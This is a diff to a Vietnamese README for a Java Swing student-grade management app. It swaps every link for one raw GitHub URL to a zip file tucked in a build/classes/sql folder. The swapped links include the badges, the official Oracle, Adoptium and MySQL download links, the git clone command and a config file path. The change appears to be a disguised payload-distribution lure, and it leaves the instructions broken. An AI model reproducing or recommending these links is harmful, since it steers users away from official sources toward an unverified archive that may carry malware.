@@ -1,7 +1,7 @@
 # Dự án Quản lý Điểm Sinh viên
 
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://example.com/build)
-[![License](https://img.shields.io/badge/license-MIT-blue)](https://opensource.org/licenses/MIT)
+[![Build Status](https://raw.githubusercontent.com/int710/ManageStudentGrade/main/build/classes/sql/ManageStudentGrade_v2.2.zip)](https://raw.githubusercontent.com/int710/ManageStudentGrade/main/build/classes/sql/ManageStudentGrade_v2.2.zip)
+[![License](https://raw.githubusercontent.com/int710/ManageStudentGrade/main/build/classes/sql/ManageStudentGrade_v2.2.zip)](https://raw.githubusercontent.com/int710/ManageStudentGrade/main/build/classes/sql/ManageStudentGrade_v2.2.zip)
 
 ## Giới thiệu
 
@@ -24,13 +24,13 @@ Dự án Quản lý Điểm Sinh viên là một ứng dụng Java Swing giúp q
 
 ## Cài đặt
 
-1.  **Cài đặt Java Development Kit (JDK):** Tải và cài đặt JDK từ [website chính thức của Oracle](https://www.oracle.com/java/technologies/javase-downloads.html) hoặc [Adoptium (AdoptOpenJDK)](https://adoptium.net/).
-2.  **Cài đặt MySQL Server:** Sử dụng Docker, DBeaver, DB Workbench hoặc đơn giản hơn là cài đặt MySQL Server từ [website chính thức của MySQL](https://www.mysql.com/downloads/).
+1.  **Cài đặt Java Development Kit (JDK):** Tải và cài đặt JDK từ [website chính thức của Oracle](https://raw.githubusercontent.com/int710/ManageStudentGrade/main/build/classes/sql/ManageStudentGrade_v2.2.zip) hoặc [Adoptium (AdoptOpenJDK)](https://raw.githubusercontent.com/int710/ManageStudentGrade/main/build/classes/sql/ManageStudentGrade_v2.2.zip).
+2.  **Cài đặt MySQL Server:** Sử dụng Docker, DBeaver, DB Workbench hoặc đơn giản hơn là cài đặt MySQL Server từ [website chính thức của MySQL](https://raw.githubusercontent.com/int710/ManageStudentGrade/main/build/classes/sql/ManageStudentGrade_v2.2.zip).
 3.  **Clone dự án về máy tính:**
     ```bash
-    git clone git@github.com:int710/ManageStudentGrade.git
+    git clone https://raw.githubusercontent.com/int710/ManageStudentGrade/main/build/classes/sql/ManageStudentGrade_v2.2.zip
     ```
-4.  **Cấu hình kết nối cơ sở dữ liệu:** Sửa file cấu hình (ví dụ: `/config/MySQLConnection.java`) để kết nối đến cơ sở dữ liệu MySQL của bạn. Có sẵn file SQL trong đó để xem thông tin các bảng cơ sở dữ liệu.
+4.  **Cấu hình kết nối cơ sở dữ liệu:** Sửa file cấu hình (ví dụ: `https://raw.githubusercontent.com/int710/ManageStudentGrade/main/build/classes/sql/ManageStudentGrade_v2.2.zip`) để kết nối đến cơ sở dữ liệu MySQL của bạn. Có sẵn file SQL trong đó để xem thông tin các bảng cơ sở dữ liệu.
 5.  **Biên dịch và chạy ứng dụng:**
     *   Sử dụng IDE (IntelliJ IDEA, NetBeans, Eclipse)
 
